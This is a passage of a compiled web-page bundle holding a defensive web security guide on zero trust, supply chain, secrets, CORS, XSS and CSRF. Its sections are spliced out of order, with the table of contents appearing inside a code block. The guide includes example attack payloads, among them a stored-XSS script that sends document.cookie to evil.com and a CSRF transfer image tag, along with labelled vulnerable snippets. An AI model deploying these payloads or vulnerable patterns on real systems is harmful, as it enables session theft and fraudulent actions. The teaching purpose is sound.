 return response.data;\n}\n\n// Use proxy for external requests\nconst HttpsProxyAgent = require('https-proxy-agent');\n\nconst agent = new HttpsProxyAgent('http://proxy.internal:8080');\n\nawait axios.get(url, { httpsAgent: agent });\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"10-modern-security-practices",children:"10. Modern Security Practices"}),"\n",(0,r.jsx)(n.h3,{id:"zero-trust-architecture",children:"Zero Trust Architecture"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Principles:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"Never trust, always verify"}),"\n",(0,r.jsx)(n.li,{children:"Assume breach"}),"\n",(0,r.jsx)(n.li,{children:"Verify explicitly"}),"\n",(0,r.jsx)(n.li,{children:"Use least privilege access"}),"\n",(0,r.jsx)(n.li,{children:"Segment access"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Every request requires authentication and authorization\napp.use('/api/*', authenticateToken);\n\n// Context-aware access control\nfunction contextAwareAuth(req, res, next) {\n  const context = {\n    user: req.user,\n    ip: req.ip,\n    device: req.headers['user-agent'],\n    time: Date.now(),\n    location: req.headers['cf-ipcountry'] // Cloudflare\n  };\n\n  // Risk assessment\n  const risk = assessRisk(context);\n\n  if (risk > 0.7) {\n    // Require additional authentication\n    return res.status(403).json({\n      error: 'Additional authentication required',\n      requiresMFA: true\n    });\n  }\n\n  next();\n}\n\n// Micro-segmentation\nconst userService = axios.create({\n  baseURL: 'http://user-service:3001',\n  headers: { 'X-Service-Token': process.env.SERVICE_TOKEN }\n});\n\nconst paymentService = axios.create({\n  baseURL: 'http://payment-service:3002',\n  headers: { 'X-Service-Token': process.env.SERVICE_TOKEN }\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"supply-chain-security",children:"Supply Chain Security"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Package Verification:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Verify package signatures\nnpm install --ignore-scripts\n\n# Use lockfile\nnpm ci\n\n# Audit dependencies\nnpm audit\nnpm audit fix\n\n# Check for known vulnerabilities\nnpx snyk test\n\n# Use private registry\nnpm config set registry https://registry.internal.company.com\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Dependency Management:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// package.json - Pin exact versions\n{\n  "dependencies": {\n    "express": "4.18.2",\n    "helmet": "7.0.0"\n  },\n  "devDependencies": {\n    "jest": "29.5.0"\n  }\n}\n\n// .npmrc\npackage-lock=true\nsave-exact=true\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Subresource Integrity:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- Generate SRI hash --\x3e\n<script\n  src="https://cdn.example.com/app.js"\n  integrity="sha384-<hash>"\n  crossorigin="anonymous">\n<\/script>\n\n<link\n  rel="stylesheet"\n  href="https://cdn.example.com/style.css"\n  integrity="sha384-<hash>"\n  crossorigin="anonymous">\n'})}),"\n",(0,r.jsx)(n.h3,{id:"secret-management",children:"Secret Management"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Using Environment Variables:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// .env (never commit!)\nDATABASE_URL=postgresql://user:pass@localhost/db\nAPI_KEY=abc123secret\nJWT_SECRET=supersecretkey\n\n// Load with dotenv\nrequire('dotenv').config();\n\nconst dbUrl = process.env.DATABASE_URL;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Using Secret Management Services:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// AWS Secrets Manager\nconst AWS = require('aws-sdk');\nconst secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });\n\nasync function getSecret(secretName) {\n  const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();\n  return JSON.parse(data.SecretString);\n}\n\nconst dbCredentials = await getSecret('prod/database');\n\n// HashiCorp Vault\nconst vault = require('node-vault')({\n  endpoint: 'http://vault.internal:8200',\n  token: process.env.VAULT_TOKEN\n});\n\nconst secrets = await vault.read('secret/data/myapp');\nconst apiKey = secrets.data.data.api_key;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Secrets in CI/CD:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-yaml",children:'# GitHub Actions\nname: Deploy\non: [push]\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - name: Deploy\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n        run: |\n          echo "Deploying with API key"\n'})}),"\n",(0,r.jsx)(n.h3,{id:"security-monitoring--logging",children:"Security Monitoring & Logging"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Centralized Logging:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Send logs to external service\nconst { createLogger, transports } = require('winston');\nconst { LogtailTransport } = require('@logtail/winston');\n\nconst logger = createLogger({\n  transports: [\n    new LogtailTransport({ sourceToken: process.env.LOGTAIL_TOKEN }),\n    new transports.Console()\n  ]\n});\n\nlogger.info('Application started', { version: '1.0.0' });\nlogger.error('Database connection failed', { error: err.message });\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Metrics & Alerts:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Prometheus metrics\nconst promClient = require('prom-client');\nconst register = new promClient.Registry();\n\n// Custom metrics\nconst httpRequestDuration = new promClient.Histogram({\n  name: 'http_request_duration_seconds',\n  help: 'Duration of HTTP requests in seconds',\n  labelNames: ['method', 'route', 'status_code'],\n  registers: [register]\n});\n\napp.use((req, res, next) => {\n  const start = Date.now();\n\n  res.on('finish', () => {\n    const duration = (Date.now() - start) / 1000;\n    httpRequestDuration\n      .labels(req.method, req.route?.path || req.path, res.statusCode# \ud83d\udd10 Complete Web Security Guide\n\n> A comprehensive guide covering web security fundamentals, common vulnerabilities, and modern best practices for building secure web applications.\n\n---\n\n## \ud83d\udccb Table of Contents\n\n1. [Introduction to Web Security](#1-introduction-to-web-security)\n   - [What is Web Security?](#what-is-web-security)\n   - [Why Web Security Matters](#why-web-security-matters)\n   - [Security Layers](#security-layers)\n\n2. [Core Security Principles](#2-core-security-principles)\n   - [CIA Triad](#cia-triad)\n   - [AAA Framework](#aaa-framework)\n   - [Defense in Depth](#defense-in-depth)\n   - [Principle of Least Privilege](#principle-of-least-privilege)\n\n3. [Browser & Frontend Security](#3-browser--frontend-security)\n   - [Same-Origin Policy (SOP)](#same-origin-policy-sop)\n   - [Cross-Origin Resource Sharing (CORS)](#cross-origin-resource-sharing-cors)\n   - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)\n   - [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)\n   - [Clickjacking](#clickjacking)\n   - [Content Security Policy (CSP)](#content-security-policy-csp)\n   - [Subresource Integrity (SRI)](#subresource-integrity-sri)\n\n4. [Cookie Security](#4-cookie-security)\n   - [Cookie Flags Explained](#cookie-flags-explained)\n   - [Cookie Best Practices](#cookie-best-practices)\n   - [Session Management](#session-management)\n\n5. [Authentication & Authorization](#5-authentication--authorization)\n   - [Authentication Methods](#authentication-methods)\n   - [Password Security](#password-security)\n   - [JSON Web Tokens (JWT)](#json-web-tokens-jwt)\n   - [OAuth 2.0 & OpenID Connect](#oauth-20--openid-connect)\n   - [Multi-Factor Authentication (MFA)](#multi-factor-authentication-mfa)\n   - [WebAuthn & Passkeys](#webauthn--passkeys)\n   - [Authorization Patterns](#authorization-patterns)\n\n6. [Backend & API Security](#6-backend--api-security)\n   - [Input Validation](#input-validation)\n   - [SQL Injection](#sql-injection)\n   - [NoSQL Injection](#nosql-injection)\n   - [Command Injection](#command-injection)\n   - [Insecure Direct Object References (IDOR)](#insecure-direct-object-references-idor)\n   - [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)\n   - [XML External Entity (XXE)](#xml-external-entity-xxe)\n   - [API Security Best Practices](#api-security-best-practices)\n\n7. [Transport & Network Security](#7-transport--network-security)\n   - [HTTPS & TLS](#https--tls)\n   - [Certificate Management](#certificate-management)\n   - [HTTP Strict Transport Security (HSTS)](#http-strict-transport-security-hsts)\n   - [DNS Security](#dns-security)\n   - [DDoS Protection](#ddos-protection)\n\n8. [Security Headers](#8-security-headers)\n   - [Essential Headers Overview](#essential-headers-overview)\n   - [Content-Security-Policy](#content-security-policy-detailed)\n   - [X-Frame-Options](#x-frame-options)\n   - [X-Content-Type-Options](#x-content-type-options)\n   - [Referrer-Policy](#referrer-policy)\n   - [Permissions-Policy](#permissions-policy)\n   - [Complete Header Configuration](#complete-header-configuration)\n\n9. [OWASP Top 10 Deep Dive](#9-owasp-top-10-deep-dive)\n   - [A01 Broken Access Control](#a01-broken-access-control)\n   - [A02 Cryptographic Failures](#a02-cryptographic-failures)\n   - [A03 Injection](#a03-injection)\n   - [A04 Insecure Design](#a04-insecure-design)\n   - [A05 Security Misconfiguration](#a05-security-misconfiguration)\n   - [A06 Vulnerable Components](#a06-vulnerable-components)\n   - [A07 Authentication Failures](#a07-authentication-failures)\n   - [A08 Software/Data Integrity Failures](#a08-softwaredata-integrity-failures)\n   - [A09 Logging & Monitoring Failures](#a09-logging--monitoring-failures)\n   - [A10 Server-Side Request Forgery](#a10-server-side-request-forgery)\n\n10. [Modern Security Practices](#10-modern-security-practices)\n    - [Zero Trust Architecture](#zero-trust-architecture)\n    - [Supply Chain Security](#supply-chain-security)\n    - [Dependency Management](#dependency-management)\n    - [Secret Management](#secret-management)\n    - [Security Monitoring & Logging](#security-monitoring--logging)\n    - [Incident Response](#incident-response)\n\n11. [Framework-Specific Security](#11-framework-specific-security)\n    - [React Security](#react-security)\n    - [Next.js Security](#nextjs-security)\n    - [Node.js/Express Security](#nodejsexpress-security)\n    - [REST API Security](#rest-api-security)\n    - [GraphQL Security](#graphql-security)\n\n12. [Testing & Auditing](#12-testing--auditing)\n    - [Security Testing Approaches](#security-testing-approaches)\n    - [Penetration Testing](#penetration-testing)\n    - [Static Application Security Testing (SAST)](#static-application-security-testing-sast)\n    - [Dynamic Application Security Testing (DAST)](#dynamic-application-security-testing-dast)\n    - [Security Audit Checklist](#security-audit-checklist)\n\n13. [Compliance & Standards](#13-compliance--standards)\n    - [GDPR](#gdpr)\n    - [PCI DSS](#pci-dss)\n    - [HIPAA](#hipaa)\n    - [SOC 2](#soc-2)\n\n14. [Security Checklists](#14-security-checklists)\n    - [Frontend Security Checklist](#frontend-security-checklist)\n    - [Backend Security Checklist](#backend-security-checklist)\n    - [API Security Checklist](#api-security-checklist)\n    - [Deployment Security Checklist](#deployment-security-checklist)\n\n15. [Resources & Tools](#15-resources--tools)\n\n---\n\n## 1. Introduction to Web Security\n\n### What is Web Security?\n\nWeb security encompasses all practices, technologies, and processes designed to protect web applications, their users, and data from unauthorized access, attacks, and exploitation. It's a continuous process of identifying vulnerabilities and implementing protective measures.\n\n**Key Components:**\n- **Application Security**: Protecting the code and logic\n- **Data Security**: Protecting sensitive information\n- **Network Security**: Protecting communication channels\n- **Infrastructure Security**: Protecting servers and hosting environments\n\n### Why Web Security Matters\n\n**Real-World Impact:**\n- **Data Breaches**: Average cost of $4.45M per breach (2023)\n- **Reputation Damage**: Loss of customer trust\n- **Legal Consequences**: GDPR fines up to \u20ac20M or 4% of revenue\n- **Business Disruption**: Downtime and lost revenue\n\n**Common Attack Vectors:**\n- 43% of cyberattacks target small businesses\n- 95% of cybersecurity breaches are due to human error\n- Web applications are involved in 26% of data breaches\n\n### Security Layers\n\nWeb security should be implemented across three layers:\n\n1. **Client Layer (Browser/Frontend)**\n   - Input validation\n   - Secure cookie handling\n   - XSS prevention\n   - CSRF protection\n\n2. **Server Layer (Backend/APIs)**\n   - Authentication & authorization\n   - SQL injection prevention\n   - Rate limiting\n   - Secure session management\n\n3. **Network Layer (Infrastructure)**\n   - HTTPS/TLS encryption\n   - Firewall configuration\n   - DDoS protection\n   - DNS security\n\n---\n\n## 2. Core Security Principles\n\n### CIA Triad\n\nThe foundation of information security:\n\n**1. Confidentiality**\n- Data is accessible only to authorized parties\n- Encryption at rest and in transit\n- Access control mechanisms\n- Data classification\n\n**2. Integrity**\n- Data remains accurate and unaltered\n- Hash functions for verification\n- Digital signatures\n- Audit trails\n\n**3. Availability**\n- Systems remain accessible to authorized users\n- Redundancy and backups\n- DDoS protection\n- Disaster recovery plans\n\n### AAA Framework\n\n**Authentication** - *Who are you?*\n- Verifying identity\n- Username/password, biometrics, tokens\n- Multi-factor authentication\n\n**Authorization** - *What can you do?*\n- Determining access rights\n- Role-based access control (RBAC)\n- Attribute-based access control (ABAC)\n\n**Accounting/Auditing** - *What did you do?*\n- Tracking user activities\n- Logging and monitoring\n- Compliance and forensics\n\n### Defense in Depth\n\nMultiple layers of security controls:\n\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Perimeter Security (WAF)      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Network Security (Firewall)   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Application Security          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Data Security (Encryption)    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502   Physical Security             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\n### Principle of Least Privilege\n\nGrant minimum access necessary:\n- Users get only required permissions\n- Time-limited access tokens\n- Separation of duties\n- Regular permission audits\n\n---\n\n## 3. Browser & Frontend Security\n\n### Same-Origin Policy (SOP)\n\n**What It Is:**\nThe cornerstone of web security. Prevents scripts from one origin from accessing data from another origin.\n\n**Origin Definition:**\n"})}),"\n",(0,r.jsx)(n.p,{children:"Origin = Protocol + Domain + Port"}),"\n",(0,r.jsxs)(n.p,{children:["\u2705 Same Origin:\n",(0,r.jsx)(n.a,{href:"https://example.com:443/page1",children:"https://example.com:443/page1"}),"\n",(0,r.jsx)(n.a,{href:"https://example.com:443/page2",children:"https://example.com:443/page2"})]}),"\n",(0,r.jsxs)(n.p,{children:["\u274c Different Origin:\n",(0,r.jsx)(n.a,{href:"https://example.com",children:"https://example.com"}),"      vs  ",(0,r.jsx)(n.a,{href:"http://example.com",children:"http://example.com"})," (protocol)\n",(0,r.jsx)(n.a,{href:"https://example.com",children:"https://example.com"}),"      vs  ",(0,r.jsx)(n.a,{href:"https://api.example.com",children:"https://api.example.com"})," (subdomain)\n",(0,r.jsx)(n.a,{href:"https://example.com:443",children:"https://example.com:443"}),"  vs  ",(0,r.jsx)(n.a,{href:"https://example.com:8080",children:"https://example.com:8080"})," (port)"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"\n**What SOP Protects:**\n- DOM access\n- Cookie access\n- AJAX requests\n- LocalStorage/SessionStorage\n\n**Best Practices:**\n\u2705 **Use:** Rely on SOP as foundational protection\n\u2705 **Use:** CORS for controlled cross-origin access\n\u274c **Avoid:** Disabling SOP (never do this)\n\u274c **Avoid:** Using JSONP (outdated and insecure)\n\n### Cross-Origin Resource Sharing (CORS)\n\n**What It Is:**\nMechanism to relax Same-Origin Policy in a controlled manner.\n\n**How It Works:**\n```http\n# Browser sends preflight request\nOPTIONS /api/data HTTP/1.1\nOrigin: https://frontend.com\nAccess-Control-Request-Method: POST\n\n# Server responds\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: POST, GET\nAccess-Control-Allow-Credentials: true\nAccess-Control-Max-Age: 3600\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Configuration Examples:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Express.js:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const cors = require('cors');\n\n// \u274c INSECURE - Never do this in production\napp.use(cors({\n  origin: '*',\n  credentials: true\n}));\n\n// \u2705 SECURE - Whitelist specific origins\napp.use(cors({\n  origin: ['https://app.example.com', 'https://admin.example.com'],\n  credentials: true,\n  methods: ['GET', 'POST', 'PUT', 'DELETE'],\n  allowedHeaders: ['Content-Type', 'Authorization'],\n  maxAge: 86400\n}));\n\n// \u2705 SECURE - Dynamic validation\napp.use(cors({\n  origin: function (origin, callback) {\n    const allowedOrigins = process.env.ALLOWED_ORIGINS.split(',');\n    if (!origin || allowedOrigins.includes(origin)) {\n      callback(null, true);\n    } else {\n      callback(new Error('Not allowed by CORS'));\n    }\n  },\n  credentials: true\n}));\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Specific origin whitelist\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Credentials only with trusted origins\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Appropriate methods and headers\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," ",(0,r.jsx)(n.code,{children:"Access-Control-Allow-Origin: *"})," with credentials\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Reflecting origin header without validation\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Overly permissive configurations"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common Mistakes:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// \u274c DANGEROUS - Reflects any origin with credentials\napp.use((req, res, next) => {\n  res.header('Access-Control-Allow-Origin', req.headers.origin);\n  res.header('Access-Control-Allow-Credentials', 'true');\n  next();\n});\n\n// \u2705 SAFE - Validates before reflecting\nconst allowedOrigins = ['https://app.example.com'];\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (allowedOrigins.includes(origin)) {\n    res.header('Access-Control-Allow-Origin', origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n  }\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"cross-site-scripting-xss-1",children:"Cross-Site Scripting (XSS)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nInjecting malicious scripts into trusted websites that execute in victims' browsers."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Types of XSS:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Stored XSS (Most Dangerous)"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Attacker submits comment:\n<script>\n  fetch('https://evil.com/steal?cookie=' + document.cookie);\n<\/script>\n\n// Stored in database, executed for all users viewing the comment\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Reflected XSS"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// URL: https://example.com/search?q=<script>alert(1)<\/script>\n\n// Server reflects input:\n<div>Search results for: <script>alert(1)<\/script></div>\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. DOM-Based XSS"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// URL: https://example.com/#<img src=x onerror=alert(1)>\n\n// Vulnerable JavaScript:\ndocument.body.innerHTML = location.hash.slice(1);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention Strategies:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Output Encoding:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// \u274c VULNERABLE\nfunction displayName(name) {\n  document.getElementById(\'output\').innerHTML = name;\n}\n\n// \u2705 SAFE - Use textContent\nfunction displayName(name) {\n  document.getElementById(\'output\').textContent = name;\n}\n\n// \u2705 SAFE - HTML encode\nfunction escapeHtml(unsafe) {\n  return unsafe\n    .replace(/&/g, "&amp;")\n    .replace(/</g, "&lt;")\n    .replace(/>/g, "&gt;")\n    .replace(/"/g, "&quot;")\n    .replace(/\'/g, "&#039;");\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. React (Automatic Escaping):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-jsx",children:"// \u2705 SAFE - Automatic escaping\nfunction UserGreeting({ username }) {\n  return <div>Hello, {username}</div>;\n}\n\n// \u274c DANGEROUS - Bypasses escaping\nfunction UnsafeComponent({ html }) {\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n\n// \u2705 SAFE - Sanitize first\nimport DOMPurify from 'dompurify';\n\nfunction SafeComponent({ html }) {\n  const clean = DOMPurify.sanitize(html);\n  return <div dangerouslySetInnerHTML={{ __html: clean }} />;\n}\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Content Security Policy:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-2726c7f26c';\n  style-src 'self' 'unsafe-inline';\n  img-src 'self' https://cdn.example.com;\n  object-src 'none';\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Input Validation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Server-side validation\nconst validateUsername = (username) => {\n  const regex = /^[a-zA-Z0-9_-]{3,20}$/;\n  if (!regex.test(username)) {\n    throw new Error('Invalid username format');\n  }\n  return username;\n};\n\n// Sanitization library\nconst sanitizeHtml = require('sanitize-html');\n\nconst clean = sanitizeHtml(dirtyHtml, {\n  allowedTags: ['b', 'i', 'em', 'strong', 'a', 'p'],\n  allowedAttributes: {\n    'a': ['href']\n  },\n  allowedSchemes: ['http', 'https', 'mailto']\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Framework's built-in escaping (React, Vue, Angular)\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," DOMPurify for HTML sanitization\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Content Security Policy\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," HTTPOnly cookies for sensitive data\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," innerHTML with user input\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," eval() with untrusted data\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," document.write()\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Disabling framework protections"]}),"\n",(0,r.jsx)(n.h3,{id:"cross-site-request-forgery-csrf-1",children:"Cross-Site Request Forgery (CSRF)"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"What It Is:"}),"\nForcing authenticated users to perform unwanted actions."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Attack Example:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- Attacker\'s malicious website --\x3e\n<img src="https://bank.com/transfer?to=attacker&amount=1000">\n\n\x3c!-- User is logged into bank.com, browser automatically sends cookies --\x3e\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention Strategies:"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. CSRF Tokens (Synchronizer Token Pattern):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express middleware\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get('/form', csrfProtection, (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\napp.post('/submit', csrfProtection, (req, res) => {\n  // Token validated automatically\n  res.send('Success');\n});\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-html",children:'\x3c!-- HTML form --\x3e\n<form method="POST" action="/submit">\n  <input type="hidden" name="_csrf" value="{{csrfToken}}">\n  <button type="submit">Submit</button>\n</form>\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. SameSite Cookies:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Set cookies with SameSite attribute\nres.cookie('sessionId', sessionId, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict', // or 'lax'\n  maxAge: 3600000\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"SameSite Values:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Strict"}),": Cookie sent only for same-site requests"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Lax"}),": Cookie sent for top-level navigation (default in modern browsers)"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"None"}),": Cookie sent for all requests (requires ",(0,r.jsx)(n.code,{children:"Secure"}),")"]}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Double Submit Cookie:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Set CSRF token in cookie AND require it in request\napp.use((req, res, next) => {\n  const token = generateToken();\n  res.cookie('csrf-token', token, { sameSite: 'strict' });\n  req.csrfToken = token;\n  next();\n});\n\n// Validate token\napp.post('/api/*', (req, res, next) => {\n  const cookieToken = req.cookies['csrf-token'];\n  const headerToken = req.headers['x-csrf-token'];\n\n  if (!cookieToken || cookieToken !== headerToken) {\n    return res.status(403).json({ error: 'Invalid CSRF token' });\n  }\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Custom Request Headers:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Frontend - Add custom header\nfetch('/api/data', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'X-Requested-With': 'XMLHttpRequest' // CSRF mitigation\n  },\n  credentials: 'include',\n  body: JSON.stringify(data)\n});\n\n// Backend - Verify header presence\napp.post('/api/*', (req, res, next) => {\n  if (!req.headers['x-requested-with']) {\n    return res.status(403).json({ error: 'Missing required header' });\n  }\n  next();\n});\n"})}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Best Practices:"}),"\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," SameSite=Lax or Strict for session cookies\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," CSRF tokens for state-changing operations\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," Custom headers for API requests\n\u2705 ",(0,r.jsx)(n.strong,{children:"Use:"})," GET for read-only operations\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," GET requests for state changes\n\u274c ",(0,r.jsx)(n.strong,{children:"Avoid:"})," Relying solely on cookies for authentication\n\u274c 